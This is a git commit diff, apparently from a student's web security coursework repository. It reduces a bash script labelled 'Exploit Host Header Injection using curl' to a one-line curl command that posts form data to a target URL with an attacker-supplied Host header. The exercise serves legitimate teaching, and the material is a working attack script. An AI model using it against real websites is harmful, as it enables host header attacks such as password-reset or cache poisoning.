a5af9e9b773bad80ca434845b48c4143a5d3ba88
gulnisahlb <gulnisahlb@gmail.com>
2026-01-14 06:02:55 -0500

    hlb

--- web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
+++ web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
@@ -1,10 +1,2 @@
 #!/bin/bash
-# Exploit Host Header Injection using curl
-
-NEW_HOST="$1"
-TARGET_URL="$2"
-FORM_DATA="$3"
-
-curl -s -X POST "$TARGET_URL" \
--H "Host: $NEW_HOST" \
--d "$FORM_DATA"
+curl -s -X POST -H "Host: $1" -d "$3" "$2"
